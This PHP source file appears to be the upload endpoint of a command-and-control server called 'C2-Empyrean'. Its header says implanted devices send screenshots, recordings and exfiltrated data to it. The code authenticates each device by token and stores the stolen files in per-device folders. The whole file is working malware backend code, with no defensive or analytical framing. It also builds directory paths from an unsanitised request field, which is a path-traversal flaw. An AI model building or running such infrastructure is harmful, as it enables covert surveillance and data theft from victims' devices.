<?php
/**
 * C2-Empyrean - API: File Upload from Device
 * POST /api/upload
 * Device sends files (screenshots, recordings, exfiltrated data)
 */

$deviceToken = $_SERVER['HTTP_X_DEVICE_TOKEN'] ?? '';
$deviceId = $_SERVER['HTTP_X_DEVICE_ID'] ?? '';

if (!$deviceToken || !$deviceId) {
    http_response_code(401);
    echo json_encode(['success' => false, 'error' => 'Device authentication required']);
    exit;
}

// Verify device
$devices = $db->read('devices');
$validDevice = false;
foreach ($devices as $d) {
    if (($d['device_id'] ?? '') === $deviceId && hash_equals($d['auth_token'] ?? '', $deviceToken)) {
        $validDevice = true;
        break;
    }
}

if (!$validDevice) {
    http_response_code(403);
    echo json_encode(['success' => false, 'error' => 'Invalid device credentials']);
    exit;
}

// Handle file upload
if (!isset($_FILES['file'])) {
    http_response_code(400);
    echo json_encode(['success' => false, 'error' => 'No file uploaded']);
    exit;
}

$file = $_FILES['file'];
if ($file['error'] !== UPLOAD_ERR_OK) {
    http_response_code(400);
    echo json_encode(['success' => false, 'error' => 'Upload error code: ' . $file['error']]);
    exit;
}

// Create device upload directory
$deviceDir = UPLOAD_DIR . '/' . $deviceId;
if (!is_dir($deviceDir)) mkdir($deviceDir, 0755, true);

// Create subdirectory by type
$fileType = $_POST['type'] ?? 'misc';
$typeDir = $deviceDir . '/' . $fileType;
if (!is_dir($typeDir)) mkdir($typeDir, 0755, true);

// Generate unique filename
$originalName = basename($file['name']);
$ext = pathinfo($originalName, PATHINFO_EXTENSION);
$timestamp = date('Ymd_His');
$uniqueName = "{$timestamp}_{$deviceId}." . ($ext ?: 'bin');
$destPath = $typeDir . '/' . $uniqueName;

if (!move_uploaded_file($file['tmp_name'], $destPath)) {
    http_response_code(500);
    echo json_encode(['success' => false, 'error' => 'Failed to save file']);
    exit;
}

$fileSize = filesize($destPath);

echo json_encode([
    'success' => true,
    'data' => [
        'filename' => $uniqueName,
        'original_name' => $originalName,
        'type' => $fileType,
        'size' => $fileSize,
        'path' => "uploads/{$deviceId}/{$fileType}/{$uniqueName}",
        'message' => 'File uploaded successfully',
    ],
]);
